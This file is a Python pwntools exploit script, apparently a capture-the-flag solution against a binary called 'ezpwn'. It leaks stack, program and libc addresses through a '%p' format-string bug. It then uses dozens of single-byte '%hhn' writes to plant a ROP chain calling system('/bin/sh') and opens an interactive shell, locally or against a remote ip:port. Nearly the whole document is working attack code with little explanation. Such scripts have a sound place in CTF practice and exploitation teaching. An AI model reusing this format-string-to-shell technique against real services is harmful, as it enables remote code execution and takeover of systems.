#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1

filename = "./ezpwn"
if LOCAL:
    p = process(filename)
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    p = remote(remote_service[0], int(remote_service[1]))
e = ELF(filename, checksec=False)
libc = ELF(e.libc.path, checksec=False)


rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugB():
    if LOCAL:
        lg("p.pid")
        input()
    pass

ru(b'Welcome to my pwn home, Please let me know your name first.\n')
name = b"testNAME"
s(name)

#  ru(b" is wrong, plz try again")
payload = b"%p."*10
s(payload)
ru(b"Your password ")
stack_base1 = int(ru(b".", "drop"), 16) + 0x2120
ru(b".")
ru(b".")
ru(b".")
ru(b".")
stack_base = int(ru(b".", "drop"), 16) - 0x10
elf_base = int(ru(b".", "drop"), 16) - 0x1390
ru(b".")
libc_base = int(ru(b".", "drop"), 16) - 0x28565
lg("stack_base1")
lg("stack_base")
lg("elf_base")
lg("libc_base")
pop_rdi_ret = elf_base + 0x0000000000001403
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.symbols['system']
ret_addr = pop_rdi_ret + 1

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base+0xa8)&0xffff).encode() + b"c%26$hn"
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8)&0xff).encode() + b"c%39$hhn"
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 0xa8 + 1)&0xff).encode() + b"c%26$hhn"
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((stack_base + 8) >> 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((pop_rdi_ret))&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 0xa8)&0xff).encode() + b"c%26$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 1)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((pop_rdi_ret >> 8))&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr))&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 1)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 8)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 2)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 16)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 3)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 24)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 4)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 32)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 5)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 40)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 0)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 0)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 1)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 8)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 2)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 16)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 3)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 24)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 4)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 32)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 5)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 40)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 0 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 0)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 1 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 8)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 2 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 16)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 3 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 24)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 4 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 32)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 5 +8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 40)&0xff).encode() + b"c%27$hhn"
s(payload)
debugB()
ru(b"Your password ")


ru(b" is wrong, plz try again")
sl(b"fakepwn")


irt()
